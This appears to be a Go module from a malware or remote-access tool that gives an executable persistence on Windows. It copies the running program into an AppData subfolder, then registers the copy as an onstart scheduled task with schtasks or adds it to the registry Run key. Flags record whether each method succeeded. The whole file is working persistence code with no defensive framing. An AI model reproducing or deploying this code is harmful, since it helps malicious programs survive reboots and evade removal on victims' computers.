package system

import (
	"io"
	"os"
	"os/exec"
	"path/filepath"
)

// Persistence monitoring variables.
var (
	StartupPersistenceCreated   bool
	SchedulerPersistenceCreated bool
)

// `DuplicateFileToAppData` duplicates the passed filePath to a new directory
// in the AppData directory with the name specified by the passed directoryName.
func DuplicateFileToAppData(filePath, directoryName, fileName string) (string, error) {
	// Get the path of the machines AppData/Roaming directory.
	roamingDir, err := os.UserConfigDir()
	if err != nil {
		return "", err
	}

	// Create a subdirectory to store the persistent executable.
	duplicateDir := filepath.Join(roamingDir, directoryName)
	if err := os.MkdirAll(duplicateDir, 0700); err != nil {
		return "", err
	}

	// Copy the current executable to the startup directory.
	destFilePath := filepath.Join(duplicateDir, fileName)
	destFile, err := os.Create(destFilePath)
	if err != nil {
		return "", err
	}
	defer destFile.Close()

	srcFile, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer srcFile.Close()

	if _, err := io.Copy(destFile, srcFile); err != nil {
		return "", err
	}

	return destFilePath, nil
}

// `CreateTaskSchedulerPersistence` creates persistence for the passed file by copying it
// to the AppData folder and creating a windows task scheduler for it to run each startup.
func CreateTaskSchedulerPersistence(fileName, directoryName string) error {
	// Get the path of the current executable file.
	currentFile, err := os.Executable()
	if err != nil {
		return err
	}

	// Duplicate the current executable to the AppData folder and continue with the persistence if successful.
	if path, err := DuplicateFileToAppData(currentFile, directoryName, fileName); err != nil {
		return err
	} else {
		// Create the task scheduler (schtasks) command using the supplied directory name and created file.
		cmd := exec.Command("schtasks", "/create", "/tn", "\""+directoryName+"\"", "/sc", "onstart", "/tr", "\""+path+"\"")
		if err := cmd.Run(); err != nil {
			return err
		}
	}

	SchedulerPersistenceCreated = true
	return nil
}

// `CreateStartupPersistence` creates persistence for the passed file by copying it
// to the AppData folder and adding it to startup via the Windows registry.
func CreateStartupPersistence(fileName, directoryName string) error {
	// Get the path of the current executable file.
	currentFile, err := os.Executable()
	if err != nil {
		return err
	}

	// Duplicate the current executable to the AppData folder and continue with the persistence if successful.
	if path, err := DuplicateFileToAppData(currentFile, directoryName, fileName); err != nil {
		return err
	} else {
		// Use the Windows registry to add the duplicated executable's path to the CurrentVersion/Run folder.
		if err := AddFileToStartup(path, directoryName); err != nil {
			return err
		}
	}

	StartupPersistenceCreated = true
	return nil
}
